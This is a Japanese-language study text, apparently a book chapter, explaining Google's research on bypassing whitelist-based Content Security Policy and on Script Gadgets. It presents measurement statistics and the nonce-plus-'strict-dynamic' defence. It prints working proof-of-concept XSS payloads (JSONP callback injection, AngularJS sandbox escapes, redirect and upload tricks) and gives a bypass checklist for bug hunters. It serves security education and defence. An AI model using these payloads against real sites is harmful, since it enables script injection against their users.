サーバが返すレスポンス:

```js
/* API response */
alert(document.domain);//{"var": "data", ...});
```

> なぜ動くか: `callback` パラメータの値がレスポンス先頭にそのまま展開され、それがJavaScriptとしてパースされます。攻撃者はコールバック名の位置に `alert(document.domain);//` のような「関数呼び出し＋行コメント」を差し込むことで、後続のJSON部分を無効化しつつ任意のコードを実行できます。CSPから見れば、このスクリプトは**ホワイトリストに載っている正規ドメインから読み込まれている**ので、何も違反していません。

制御できる文字が制限され関数名しか指定できない場合でも、**SOME（Same Origin Method Execution）** 攻撃により、ページ内の既存の任意関数（`x.click` など）を呼び出せるため、実務上は完全なXSSと同等に危険であると論文は述べています。実測では **JSONPバイパスの39%が任意のJS実行を許し、残りはSOME攻撃が可能** でした。

DeepSecスライドの図解は挙動を端的に示します。

```
">'><script src="https://whitelisted.com/jsonp?callback= alert(1);u">
  → レスポンス: alert(1);u({...})            ← 完全なJS実行

">'><script src="https://whitelisted.com/jsonp?callback= x.click">
  → レスポンス: x.click({...})               ← SOME攻撃
```

スライドの教訓は「**JSONPエンドポイントをホワイトリストに載せてはいけない。しかし世の中には大量に存在する — 特にCDNに**」です。

#### (2) リフレクション／シンボリック実行によるJSガジェット

ホワイトリストされたオリジンにある「協力的なスクリプト」が、意図せずCSPを回避させてしまうケースです。論文Listing 7:

```js
// Can be used to invoke window.* functions with
// arbitrary arguments via markup such as:
// <input id="cmd" value="alert,safe string">
var array =
  document.getElementById('cmd').value.split(',');
window[array[0]].apply(this, array.slice(1));
```

> なぜ動くか: このコード自体は「開発者が用意したDOM要素の値で関数を呼ぶ」だけで、単体では脆弱性ではありません。問題は、マークアップ注入のバグがあるアプリでこのスクリプトが読み込まれると、攻撃者が `id="cmd"` を持つ要素を注入することで `window[...]` に任意の関数名と引数を渡せる点です。スクリプト本体は正規のホワイトリストされたドメインから来ているため、CSPは一切ブロックしません。

最も影響が大きい実例が **AngularJS** です。論文Listing 8:

```html
<script src="whitelisted.com/angular.js"></script>
<div ng-app>{{ 1000 - 1 }}</div>
```

AngularJSはページ内の指定領域をテンプレートとしてパースし評価します。既定では `eval()` を使うため `'unsafe-eval'` のないCSPでは止まりますが、AngularJSには **「CSP互換モード」(`ng-csp`)** が用意されており、このモードでは式をシンボリック実行（インタプリタ的に評価）するため、**`'unsafe-eval'` なしでも任意のJavaScript相当の処理が可能**になります。DeepSecスライドの具体ペイロード:

```html
"><script src="https://whitelisted.com/angular.min.js"></script>
<div ng-app ng-csp>{{1336 + 1}}</div>

"><script src="https://whitelisted.com/angularjs/1.1.3/angular.min.js"></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```

> なぜ動くか: 1つ目は式評価が生きていることの確認（`1337` が表示される）。2つ目はAngularJS 1.1.3という**サンドボックスバイパスが知られた旧バージョン**を狙い、`$event.view` からグローバルの `window` を取り出して `alert` を呼びます。`ng-click` はユーザ操作が必要ですが、スライドは「JSONPエンドポイントや他のJSライブラリと組み合わせればユーザ操作なしでも動く」と注記しています。
>
> さらに強力な組み合わせとして、古いPrototype.jsを併用する例が示されています。
>
> ```html
> <script src="//whitelisted.com/angular.js"></script>
> <script src="//whitelisted.com/prototype.js"></script>
> <div ng-app ng-csp>{{$on.curry.call().alert(1)}}</div>
> ```
>
> Prototype.jsが `Function.prototype.curry` を定義しているため、AngularJSのサンドボックス内から `curry.call()` を経由して `this` がグローバルオブジェクト（`window`）になったコンテキストを獲得でき、`alert` に到達します。

決定的なのは、**攻撃対象のアプリがAngularJSを一切使っていなくても、ホワイトリストされたドメインのどこかにAngularJSが置いてあるだけでCSPが無効化される**という点です。論文の表現では「trusted domainにAngularライブラリが存在するだけで、CSPが提供する保護は覆される」。

#### (3) 意図せずJavaScriptとしてパースできてしまうレスポンス

ブラウザは互換性のため、レスポンスのMIMEタイプと利用コンテキストの一致を厳密に検査しません。したがって **「構文エラーなくJavaScriptとしてパースでき、かつ攻撃者制御のデータが最初の実行時エラーより前に現れる」レスポンスはすべてスクリプトになりえます**。論文が挙げる類型:

```
Name,Value
alert(1),234
```

```
Error: alert(1)// not found.
```

- 攻撃者が一部を制御できるCSV（カンマ区切り）データ
- リクエストパラメータをそのまま含むエラーメッセージ
- **ユーザのファイルアップロード**（たとえHTMLエスケープ／サニタイズ済みでも）

> なぜ動くか: `alert(1),234` はJavaScriptとしては「`alert(1)` を評価し、カンマ演算子で `234` を評価する」有効な式文です。`Name,Value` の行で `Name` と `Value` は未定義変数参照となり得ますが、パース自体は通り、実行時エラーが起きる前に `alert(1)` が到達すれば攻撃は成立します。

DeepSecスライドは、この帰結として `script-src 'self'` と**同一オリジンでのユーザコンテンツ配信**の組み合わせが危険であることを強調します。

```html
">'><script src="/user_upload/evil_cat.jpg.js"></script>
```

同様に、`object-src` のホワイトリスト先にFlashとして解釈されるファイルをアップロードできれば、そこからスクリプト実行が可能です。

論文はここで重要な指摘をしています。**これらのパターンはそれ自体では直接のセキュリティリスクではないため、開発者に修正の動機がない**。CSPを導入して初めて問題になるのですが、影響を受けるのは自分のオリジンだけでなく、`script-src` に書いたすべてのサードパーティやCDN — つまり**自分が修正を依頼できない相手**にまで及びます。

#### (4) パス制限はセキュリティ機構として機能しない

CSP2はドメイン単位の粒度の粗さを補うためパス指定（`example.org/foo/bar`）を導入しました。しかし、クロスオリジンリダイレクトに関するプライバシー上の懸念（Homakovの "Using Content-Security-Policy for Evil" で議論された、パス情報のクロスオリジン漏洩）への対処として、**リダイレクトの結果として読み込まれたリソースについては、ソース式のパス部分を無視する**という緩和が仕様に入りました。論文Listing 9:

```
Content-Security-Policy: script-src example.org
    partially-trusted.org/foo/bar.js
```

```html
// Allows loading of untrusted resources via:
<script src="//example.org?
    redirect=partially-trusted.org/evil/script.js">
```

DeepSecスライドのより実戦的な例:

```
script-src https://whitelisted.com/totally/secure.js https://site.with.redirect.com;
object-src 'none';
```

```html
">'><script src="https://site.with.redirect.com/redirect?url=https%3A//whitelisted.com/jsonp%2Fcallback%3Dalert">
```

> なぜ動くか: ブラウザはまず `site.with.redirect.com`（ホワイトリスト済み）へリクエストします。そこから `whitelisted.com/jsonp?callback=alert` へ30xリダイレクトされると、リダイレクト後のマッチング処理では**パス成分が無視される**ため、「`/totally/secure.js` だけ許可」という意図は無効化され、同じホストの任意のパス（ここではJSONPエンドポイント）が読み込めてしまいます。仕様の原文は「パス情報のクロスオリジン漏洩を避けるため、リダイレクトの結果ロードされたリソースについてはソース式のパス成分をマッチングアルゴリズムが無視する」と述べています。

OAuthやリファラ漏洩防止など、複雑なアプリにはリダイレクタが普遍的に存在します。したがって論文は「**パス制限はCSPのセキュリティ機構として依拠できない**」と結論します。

> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf

### 大規模実測：数字が語る「CSPは死んでいる」

#### データセットと方法論

- 使用したのはGoogle検索インデックス（約6.5ペタバイト、直近約20日以内にクロールされたレスポンスヘッダとボディ）。
- インデックスには約**1060億のユニークURL**、**10億のホスト名**、1億7500万のtop private domainが含まれる。
- そのうち **3,913,578,446 URL（3.7%）** がCSPを持っていた。ただしURL単位では巨大サイトが過大評価されるため、ホスト単位で見ると **1,664,019ホスト（全ホスト名の0.16%）／274,214 top private domain** がCSPを配信していた（論文アブストラクトでは1,680,867ホストと記載）。
- 100万ホストが5つのEコマースアプリのいずれかにマップされ（例：Alibabaのミニショップは60万超のホストに同一CSPを配信）、ごく少数のポリシーが大量に重複していた。そこで**正規化**（余分な空白除去、nonce/report-uriなど可変値のプレースホルダ化、ディレクティブと値の順序統一・重複排除）した上で重複排除し、最終的に **26,011個のユニークなポリシー** を得た。
- 同時にバイパス材料も収集: **880万のJSONPエンドポイント**（`callback` / `cb` / `json` / `jsonp` というGETパラメータを持つURLを抽出し、値を変えてリクエストしてレスポンス先頭に反映されるか実検証）と、**260万のAngularJSライブラリ**（ソースコードのシグネチャでマッチし、バージョン文字列も抽出）。ドメイン単位では **194,908ドメインがJSONPエンドポイントを持ち、101,330ドメインがAngularJSをホスト**していました。

判定は自動化された4つのチェック — (1) nonceなしの `'unsafe-inline'`、(2) `object-src` も `default-src` も無い、(3) ホワイトリストに汎用ワイルドカードやURIスキーム（`http:` / `https:` / `data:`）が入っている、(4) ホワイトリストにバイパス可能エンドポイントを持つホストが入っている — で行われました。

#### 用途の実態

ディレクティブの出現頻度（Figure 1）は `script-src` 22,573 / `default-src` 22,294 / `style-src` 20,346 / `img-src` 20,179 …と続き、`frame-ancestors` はわずか2,111（**全体の8.1%**）でした。また26,011ポリシーのうち report-only は **9.96%** にとどまり、**90.04%が強制(enforcing)モード**。これは「CSPは主にXSS対策として使われている」ことの明確な証拠だと論文は述べます。

#### 中核の数字（論文Table 2）

| データセット | 総数 | Report Only | unsafe-inline | object-src欠落 | ワイルドカード | 危険なドメイン | **自明にバイパス可能** |
|---|---|---|---|---|---|---|---|
| ユニークCSP | 26,011 | 2,591 (9.96%) | 21,947 (84.38%) | 3,131 (12.04%) | 5,753 (22.12%) | 19,719 (75.81%) | **24,637 (94.72%)** |
| XSS保護ポリシー | 22,425 | 0 (0%) | 19,652 (87.63%) | 2,109 (9.4%) | 4,816 (21.48%) | 17,754 (79.17%) | **21,232 (94.68%)** |
| 厳格なXSS保護ポリシー | 2,437 | 0 (0%) | 0 (0%) | 348 (14.28%) | 0 (0%) | 1,015 (41.65%) | **1,244 (51.05%)** |

ここで「XSS保護ポリシー」とは**強制モードで、かつ `script-src` または `default-src` を含むもの**、「厳格なXSS保護ポリシー」とはさらに `'unsafe-inline'`・URIスキーム・汎用 `*` ワイルドカードといった本質的に危険な値を一切含まないものです。

読み取るべきポイントは3つです。

- 全体の94.72%、XSS保護目的に限っても94.68%がバイパス可能。
- 論文は「**CSPを配信しているホストの99.34%が、XSSに対して何の利益も無いポリシーを使っている**」とも述べています。
- そして最も重要なのは最終行です。**「危険なキーワードを一切使わず、真面目に作られた」2,437個の厳格なポリシーですら、51.05%が自動ツールだけでバイパスできた**。その大半の原因は `script-src` ホワイトリスト内の危険なオリジンでした。しかもこれは「完全自動で見つかった分」なので**下限値**であり、実際の不安全率はさらに高いと論文は注記しています。

#### ホワイトリストは長くなるほど壊れる

ポリシーあたりのホワイトリストエントリ数は**中央値12**、最長のものは **512ホスト**。そして「**中央値の12エントリの時点で、全ポリシーの94.8%がバイパス可能**」でした（Figure 3）。短いホワイトリストはまだ安全ですが、長くなるほど急速に破綻します。

どのドメインが危険なのか。論文Table 5は、`script-src` に最も多く書かれた15ホストのバイパス可否を示します。

| 件数 | 割合 | ホスト | JSONP | AngularJS | バイパス可否 |
|---|---|---|---|---|---|
| 8,825 | 33.93% | www.google-analytics.com | unsafe-evalがあれば可 | 不可 | unsafe-evalがあれば可 |
| 7,201 | 27.68% | *.googleapis.com | 可 | 可 | **可** |
| 6,307 | 24.25% | *.google-analytics.com | unsafe-evalがあれば可 | 不可 | unsafe-evalがあれば可 |
| 5,817 | 22.36% | *.google.com | 可 | 不可 | **可** |
| 5,475 | 21.05% | *.yandex.ru | 可 | 不可 | **可** |
| 5,146 | 19.78% | *.gstatic.com | 不可 | 可 | **可** |
| 5,076 | 19.51% | vk.com | 可 | 不可 | **可** |
| 4,728 | 18.18% | mc.yandex.ru | 可 | 不可 | **可** |
| 4,423 | 17.00% | yandex.st | 不可 | 可 | **可** |
| 4,189 | 16.10% | ajax.googleapis.com | 可 | 可 | **可** |
| 3,829 | 14.72% | *.googlesyndication.com | 可 | 不可 | **可** |
| 3,621 | 13.92% | *.doubleclick.net | 可 | 不可 | **可** |
| 3,617 | 13.91% | yastatic.net | 不可 | 可 | **可** |
| 2,959 | 11.38% | connect.facebook.net | 不可 | 不可 | 不可 |
| 2,809 | 10.80% | www.google.com | 可 | 不可 | **可** |

すなわち **15ドメイン中12が完全なCSPバイパスを導入し、2つは `'unsafe-eval'` と組み合わさるとバイパス可能、バイパスが自動発見できなかったのは1つだけ**（`connect.facebook.net`）。そして **上位10ドメインだけで全ユニークCSPの68%をバイパスできる**（Figure 4）。さらに衝撃的な補足として、**仮にこれら上位10ドメインからJSONPとAngularJSを完全に除去したとしても、残るホストで依然として66%のポリシーがバイパス可能**でした。

バイパス手段の内訳（Table 4）は、XSS保護ポリシー22,425件のうち JSONP起因が17,381件、AngularJS起因が12,617件、`object-src` 起因（脆弱なFlashファイル）が2,915件です。

#### script-srcで実際に使われている値（Table 3）

| 値 | 使用率 |
|---|---|
| `'self'` | 90.95% |
| `'unsafe-inline'` | 87.26% |
| `'unsafe-eval'` | 81.65% |
| **nonce** | **0.92%** |
| `https:` | 3.64% |
| `http:` | 0.85% |
| `data:` | 4.04% |
| 汎用ワイルドカード `*` | 1.18% |
| ワイルドカード付きホスト | 69.59% |
| パス付きホスト | 6.92% |
| SHA-256ハッシュ | 1.65% |
| SHA-384ハッシュ | 0.04% |
| SHA-512ハッシュ | 0.01% |

**nonceの使用率がわずか0.92%** という数字が、2016年当時の実態を象徴しています。

> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/

### 解決策：nonceベースCSPと `'strict-dynamic'`

#### なぜnonceなのか

論文の提案はシンプルです。**ドメインを信頼するのをやめ、スクリプト1つ1つを信頼する**。

危険なホワイトリストベースのポリシー:

```
Content-Security-Policy: script-src example.org
```
```html
<script src="//example.org/script.js?callback=foo"></script>
```

これは `https://example.org/script?callback=malicious_code` を注入されれば終わりです。これを次のように書き換えます。

```
Content-Security-Policy:
    script-src 'nonce-random123'
    default-src 'none'
```
```html
<script nonce="random123"
  src="https://example.org/script.js?callback=foo">
</script>
```

> なぜ安全になるか: nonceはリクエストごとに生成される推測不能な値で、CSPヘッダとHTML属性の両方に現れます。マークアップ注入ができる攻撃者は、**その時のnonce値を知らない**ため、同じJSONPエンドポイントを指す `<script>` を注入しても実行されません。ホワイトリストというドメイン単位の粗い信頼が、スクリプトタグ単位の精密な信頼に置き換わります。

論文はここで運用上の注意点も述べています。**nonceベースポリシーにホワイトリストを足すとnonceの利点が失われます**（リソースはホワイトリストかnonceのどちらかを満たせば通るため）。セキュリティチームが「許可されたホスト」を中央集権的に強制したい場合は、**ブラウザが複数ポリシーをすべて満たすことを要求する性質**を利用して、カンマ区切りで2つのポリシーを配信します。

```
Content-Security-Policy:
    <!-- whitelist - based CSP -->
    script-src https://example.org
    default-src    https://foobar.org,
    <!-- nonce - based CSP -->
    script-src 'nonce-random123'
```

#### nonceの弱点と `'strict-dynamic'` の発明

nonceだけでは実務で壊れます。JavaScriptライブラリが**動的にスクリプトを追加する**パターン（極めて一般的）で、ライブラリはnonce値を知らないからです。

```html
<script nonce="r4nd0m">
  var s = document.createElement("script");
  s.src = "//example.com/bar.js";
  document.body.appendChild(s);
</script>
```

このとき `bar.js` はnonceを持たないためブロックされます。ライブラリを改造して2段目以降のスクリプトにnonceを伝播させるのは現実的ではありません。

そこで論文が提案し、CSP3ドラフトに入ったのが **`'strict-dynamic'`** です。`script-src` にnonce（またはhash）と共に書かれると、次の2つの効果が生じます。

- **動的に追加されたスクリプトの実行を許可する**。具体的には `document.createElement('script')` で作られたスクリプトノードは、その読み込み元URLがホワイトリストにあるかどうかに関係なく許可される。
- **他の `script-src` ホワイトリストエントリを無視する**。静的な（パーサが挿入した）スクリプトは、正しいnonceを伴わない限り実行されない。

```
Content-Security-Policy:
  script-src 'nonce-random123' 'strict-dynamic';
  object-src 'none';
```

> なぜ安全なままなのか: この設計の核心にある観察は「**`createElement()` で追加されるスクリプトは、すでにアプリケーションが信頼しているものである**」という点です。開発者が明示的にロードを選んだコードだからです。一方、マークアップ注入のバグを見つけた攻撃者は、**まずJavaScriptを実行できなければ `createElement()` を呼べません**。そしてJavaScriptを実行するには正しいnonceが必要です。つまり信頼は「nonceを持つ起点スクリプト」から「その子孫スクリプト」へ**推移的にのみ**伝播し、注入されたマークアップからは伝播しません。

DeepSecスライドは伝播の境界を明確に示しています。`'strict-dynamic'` が信頼を伝播させるのは **non-parser-inserted（パーサ非挿入）** なスクリプトだけです。したがって以下はいずれも**動きません**。

```html
<script nonce="r4nd0m">
  var s = "<script ";
  s += "src=//example.com/bar.js></script>";
  document.write(s);
</script>
```
```html
<script nonce="r4nd0m">
  var s = "<script ";
  s += "src=//example.com/bar.js></script>";
  document.body.innerHTML = s;
</script>
```

> なぜ動かないか: `document.write()` や `innerHTML` 経由で挿入されたスクリプトは、HTMLパーサによって生成されるため「parser-inserted」扱いになります（そもそも `innerHTML` 経由の `<script>` はHTML仕様上実行されません）。信頼の伝播はDOM APIで明示的に作られたスクリプトノードに限定されており、これが「文字列からHTMLを組み立てる」という**XSSと区別がつかないパターン**を巻き込まないための線引きです。

#### 古いブラウザへのフォールバックを含む実戦的なポリシー

DeepSecスライドが推奨する「そのままコピーして使える」形はこれです。

```
script-src 'nonce-r4nd0m' 'strict-dynamic' 'unsafe-inline' https:;
object-src 'none';
```

各トークンの役割と、ブラウザ世代ごとの解釈:

| トークン | 意味 |
|---|---|
| `'nonce-r4nd0m'` | 正しいnonceを持つスクリプトを実行許可 |
| `'strict-dynamic'` | **[新]** 信頼を伝播し、ホワイトリストを破棄する |
| `'unsafe-inline'` | CSP2以降ではnonceの存在により無視される。**CSP1しか解さない古いブラウザで `script-src` を無害化(no-op)するため**に置く |
| `https:` | HTTPSスクリプトを許可。`'strict-dynamic'` をサポートするブラウザでは破棄される |

- **CSP3対応ブラウザ**: `'strict-dynamic'` が効き、`'unsafe-inline'` と `https:` は破棄される → 最も強い保護。
- **CSP2対応ブラウザ**（nonceは理解するが `'strict-dynamic'` は知らない）: nonceの存在により `'unsafe-inline'` が破棄され、`https:` によるホワイトリストベースの保護が働く。
- **CSP1しか対応しないブラウザ**: nonceを理解しないため `'unsafe-inline'` が有効になり、ポリシーは実質no-op（=既存サイトを壊さない）。

この「**段階的に劣化するが決してサイトを壊さない**」設計が、strict CSPの採用しやすさを支えています。

#### 限界（論文4.3節 + スライド）

`'strict-dynamic'` は万能薬ではありません。

**セキュリティ上の限界:**

```html
<script nonce="r4nd0m">
  var s = document.createElement("script");
  s.src = userInput + "/x.js";
</script>
```

> なぜ問題か: XSSの根本原因が「動的に作られたスクリプトの `src` 属性に信頼できないデータが流れ込む」ことである場合、ホワイトリストベースのCSPなら読み込み先がポリシーで制限されていたのに対し、`'strict-dynamic'` では制限が外れるため**むしろ悪用可能になります**。

他の限界として、(a) nonceを付けた `<script>` の**内部**に注入点がある場合は無条件に実行されてしまう（ただしこれは従来のポリシーでも同じ）、(b) スクリプト実行を防げても post-XSS / scriptless attacks のような限定的だが有害な攻撃は残りうる、が挙げられています。

**互換性上の限界:**

- `document.write()` で動的にスクリプトを追加しているコードは `'strict-dynamic'` でブロックされるため、`createElement()` に書き換えるか、`document.write` で生成する `<script>` に明示的にnonceを渡す必要がある。
- `'strict-dynamic'` は、`javascript:` URIやインラインイベントハンドラといった**CSP非互換マークアップを除去する作業を不要にはしない**。

ただし、スライドが強調するように「**新たに生まれる攻撃面（動的スクリプトロードDOM API）は、レビューとコントロールが格段に容易**」です。ホワイトリスト上の全ドメインの全エンドポイントを監査するのと、自分のコード内の `createElement('script').src` を数えるのとでは、難易度が桁違いです。

#### 実運用の実績（ケーススタディ）

論文は Google Maps Activities（月間アクティブユーザ400万の複雑なJavaScript重量級アプリ）での経験を報告しています。

- 2015年2月にホワイトリストベースの強制CSPを導入。単純なポリシーから始めたが、アプリ・API・ライブラリの変化に追従するため **2015年を通じて5回の大きな変更** を余儀なくされた。
- 本番での破損を避けるためオリジンを定期更新した結果、`script-src` ホワイトリストは **15個の長いパス** にまで膨れ上がり、しかも**最低1つのJSONPエンドポイントを含まざるを得なかった** — つまりXSS対策としては無効だった。
- 一方、マークアップへのnonce付与はすでに済んでいたため、**ホワイトリストベースから `'strict-dynamic'` を使うnonceのみのポリシーへの移行はリファクタリング不要**だった。移行後はポリシーが劇的に単純化され、破損も減り、**それ以降ポリシーを変更する必要が一度も無かった**。
- 同様のポリシーが Google Photos、Cloud Console、History、Cultural Institute などにも展開された。DeepSecスライドの時点で **月間アクティブユーザ合計3億以上** のGoogleサービスに展開済みで、Google Maps API、Google Charts API、Facebookウィジェット、Twitterウィジェット、reCAPTCHAなどが**追加作業なしで動作する**と報告されています。

論文は、Google社内のXSSバグ数百件の根本原因分析に基づき、「**大多数のXSSはnonceベースポリシーで緩和できる**」と結論しています。

#### 診断ツール：CSP Evaluator

著者らは、実際のポリシーをこれらの基準で自動評価するツール **CSP Evaluator**（https://csp-evaluator.withgoogle.com ）を公開しています。コアライブラリはオープンソースで、Chrome拡張としても提供されています。自分のサイトのCSPが「94.72%側」に入っていないかを確認する最初の一歩として有用です。

> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf

### まとめ：バグハンター視点での読み替え

この論文の結論は、防御側にとっては「ホワイトリストを捨ててnonce + `'strict-dynamic'` へ移行せよ」というメッセージですが、攻撃側・診断側の視点で読み替えると、XSSを見つけた後に「CSPがあるから報告価値が下がる」と諦める前に確認すべきチェックリストになります。

1. **`object-src` / `default-src` はあるか。** 無ければ `<object>` + 既知の脆弱なSWFでスクリプト実行に到達しうる（2016年時点の手法。現在はFlashが廃止されているため、この経路は歴史的知識として理解する）。
2. **`'unsafe-inline'` がnonce無しで入っていないか。** 入っていればCSPは実質存在しない。
3. **`data:` やスキーム、汎用ワイルドカードは無いか。**
4. **ホワイトリストの各ホストにJSONPエンドポイントは無いか。** `callback` / `cb` / `json` / `jsonp` パラメータを試す。
5. **ホワイトリストの各ホストにAngularJS（特にサンドボックスバイパスが既知の旧版）や、`Function.prototype` を拡張する旧Prototype.jsは置かれていないか。**
6. **ホワイトリストにオープンリダイレクタは無いか。** あればパス制限は無効化できる。
7. **`'self'` が許可されていて、かつ同一オリジンに任意ファイルをアップロードできないか。**
8. **`'strict-dynamic'` がある場合は**、ホワイトリスト由来のバイパスは全て無効になるので、代わりに「動的スクリプト生成の `src` に自分の入力が届くか」「nonce付きスクリプトの内部に注入できるか」「nonceが予測可能／漏洩していないか」を探す。

そして最後に、論文自身が強調している原則を忘れないでください。**CSPは多層防御であり、入力検証と出力エンコーディングの代替ではありません。** CSPがあるかどうかにかかわらず、XSSの根本原因を潰すことが第一の防御です。

> 出典: CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy — https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/
> 出典: CSP Is Dead, Long Live Strict CSP! (DeepSec 2016, Lukas Weichselbaum) — https://deepsec.net/docs/Slides/2016/CSP_Is_Dead,_Long_Live_Strict_CSP!_Lukas_Weichselbaum.pdf

---

## Script Gadgets（CSP Evaluator / Black Hat論文）

これまでの章では、CSP（Content Security Policy）を「攻撃者が任意のスクリプトを注入しても実行させない仕組み」として学んできた。しかし現実のWebアプリケーションには、jQuery や AngularJS、Bootstrap、Vue、あるいは自社のフロントエンドコードなど、大量の**信頼された（allowlistに載っている、あるいはページに元から存在する）JavaScriptライブラリ**が動いている。

**Script Gadgets（スクリプトガジェット）** とは、ページ上に**既に存在する正規のJavaScriptコード**でありながら、**攻撃者が制御できるDOM要素（タグ・属性・クラス名・`data-*`属性など）を読み取り、その内容に基づいてスクリプトを実行してしまう副作用を持つコード片**のことを指す。攻撃者は、CSPやサニタイザ、XSSフィルタ、WAF（Web Application Firewall）を通過できる「無害に見えるHTMLタグ・属性」だけを注入し、ページ上に既に存在するgadget（正規コード）にそれを「解釈」させることで、間接的にスクリプトを実行させる。つまり、**攻撃者は`<script>`を注入する必要がない**。ページ側のライブラリが、注入されたマークアップを見て「これはUIコンポーネントの初期化指示だ」と誤解し、自らJavaScriptを実行してしまうのである。

原典の言葉を借りれば、Script Gadgetの定義はこうだ。

> Script Gadget is an *existing* JS code on the page that may be used to bypass mitigations.
> （Script Gadgetとは、緩和策をバイパスするために利用しうる、ページ上に*既に存在する*JSコードである。）
>
> Script Gadgets convert otherwise safe HTML tags and attributes into arbitrary JavaScript code execution.
> （Script Gadgetは、それ自体は安全なHTMLタグや属性を、任意のJavaScriptコード実行へと変換する。）

この節では、この技法を体系化した研究（Black Hat USA 2017 発表、同年 ACM CCS 2017 採録）と、CSPポリシーの弱点を機械的に検出するGoogleのツール「CSP Evaluator」を扱う。両者は表裏一体の関係にある。Script Gadgets研究は「ホスト許可リスト方式のCSPは、そのホストに置かれたライブラリのgadget次第でバイパスされる」という脅威モデルを実証で確立し、CSP Evaluatorは「このホストを許可すると、そこにScript Gadgetsが存在するかもしれない」という観点でポリシーを機械的に評価するツールだからである。

> ⚠️ 本節では、原典スライド（Black Hat USA 2017 の PDF）から実際に抽出したペイロードと数値、および CSP Evaluator のソースコード（`github.com/google/csp-evaluator`）から抽出した実際の検査項目・重大度・許可リストバイパス一覧を用いている。本書の方針として、公開ラボの「解答」や攻撃対象を特定した攻略手順は書かない。以下のコード例は、原典が防御研究として公開した概念実証（PoC）の引用であり、仕組みの理解を目的とする。

---

### 1. なぜCSPだけでは不十分なのか（背景となる原理）

#### 1.1 「修正」と「緩和」の違い

原典スライドは、まずXSSの「修正（fixing）」と「緩和（mitigating）」を峻別することから始める。

- **修正（fix）**: XSSを根本から断つ。正しいやり方は「文脈を理解し、デフォルトで安全に自動エスケープするテンプレートシステム」を使うこと（Christoph Kern 2014, Jad Boutros 2009 を引用）。ただし既存アプリの移行には多大な労力がかかることも多い。
- **緩和（mitigation）**: 「修正は大変だから、代わりに攻撃を難しくしよう」というアプローチ。原典はこれを皮肉を込めて "The mitigator alligator circa 2016"（2016年頃の緩和ワニ）と呼ぶ。

決定的な指摘は次の一文である。

> Mitigations do not fix the vulnerability. They try to make the attacks harder instead. The XSS is still there, it's just presumably harder to exploit it.
> （緩和策は脆弱性を修正しない。攻撃を難しくしようとするだけだ。XSSはそこに残ったままで、ただ悪用が「おそらく難しくなった」に過ぎない。）

Script Gadgets研究の核心は、この「おそらく難しくなった」という前提を、**16の主要ライブラリに対して実測で崩した**ことにある。

#### 1.2 各緩和策の「見ているもの」

原典は、当時の主要な緩和策が「何を見て危険を判定しているか」を整理する。ここが決定的に重要である。

- **WAF / XSSフィルタ（ModSecurity CRS、旧Chrome/IE/EdgeのXSS Auditor、NoScript）**: リクエストやレスポンスに含まれる**危険なタグ・属性**（`<script>`、`<XSS>`など）をパターンでブロックする。`<p width=5>` や `<b><i>` のような一見無害なマークアップは通す。
- **HTMLサニタイザ（DOMPurify、Google Closure sanitizer）**: HTMLから**危険なタグ・属性を除去**する。許可リストにある安全そうな要素・属性（`title`、`data-*`、`id`、`class` など）は残す。
- **CSP**: 「正規のJSコードと注入されたJSコードを区別」しようとする。手段は3つ――(1) 正規の**送信元（オリジン）を許可リスト化**する、(2) コードの**ハッシュ**を許可リスト化する、(3) 使い捨ての**nonce（秘密のトークン）**を要求する。

これらに共通する致命的な前提が、次の一文に凝縮されている。

> XSS mitigations work by blocking attacks. Focus is on potentially malicious tags / attributes. **Most tags and attributes are considered benign.**
> （XSS緩和策は攻撃をブロックすることで働く。焦点は「悪意のありうるタグ・属性」に当てられる。**大半のタグ・属性は無害と見なされる。**）

Script Gadgetは、まさにこの「無害と見なされたタグ・属性」を、ページ上の正規コードにJavaScript実行へと変換させる。CSPの`script-src`は「スクリプトがどこから来たか」しか判定せず、「ページに元からある正規のJSがDOM上の何を読んで何をするか」までは一切関知しない。この**構文（タグ・属性・URLスキーム）と意味（そのタグ・属性がどのライブラリにどう解釈されるか）のギャップ**こそ、Script Gadgetsが成立する根本原理である。

#### 1.3 ROPとのアナロジー

この構造は、バイナリエクスプロイトにおける **ROP（Return-Oriented Programming、既存の実行可能コード断片＝gadgetをつなぎ合わせて任意処理を組み立てる手法）** に対応する。CCS 2017版の論文タイトルが "**Code-Reuse Attacks for the Web**"（Webのためのコード再利用攻撃）であるのはこのためだ。ROPが「バイナリ中の既存の命令列を再利用する」のに対し、Script Gadgetsは「**ページ中の既存のJavaScriptロジックを再利用する**」。攻撃者は新しいコードを持ち込まず、ページに元からある部品を組み合わせて目的を達成する。

> 出典: Breaking XSS mitigations via Script Gadgets（Sebastian Lekies, Krzysztof Kotowicz, Eduardo Vela Nava — Google, Black Hat USA 2017）— https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 2. Black Hat論文の全体像と数値

#### 2.1 冒頭の結論

発表者は Sebastian Lekies（@slekies）、Krzysztof Kotowicz（@kkotowicz）、Eduardo Vela Nava（@sirdarckcat）の3名（いずれもGoogle）。スライド冒頭は挑発的な宣言で始まる。

> We will show you how we bypassed **every** XSS mitigation we tested.
> （私たちがテストした**あらゆる**XSS緩和策を、どうバイパスしたかをお見せする。）

そして「16の人気ライブラリにおける、script gadgetチェーンによる緩和策バイパス可能性」を、次の集計で提示する（分母16は調査対象ライブラリ数、分子はバイパスを達成したライブラリ数）。

| 緩和策のカテゴリ | 具体策 | バイパス達成 |
|---|---|---|
| CSP | whitelist（ホスト許可リスト） | 3 / 16 |
| CSP | nonces（nonce方式） | 4 / 16 |
| CSP | unsafe-eval を許可した場合 | 10 / 16 |
| CSP | strict-dynamic | 13 / 16 |
| XSSフィルタ | Chrome XSS Auditor | 13 / 16 |
| XSSフィルタ | Edge | 9 / 16 |
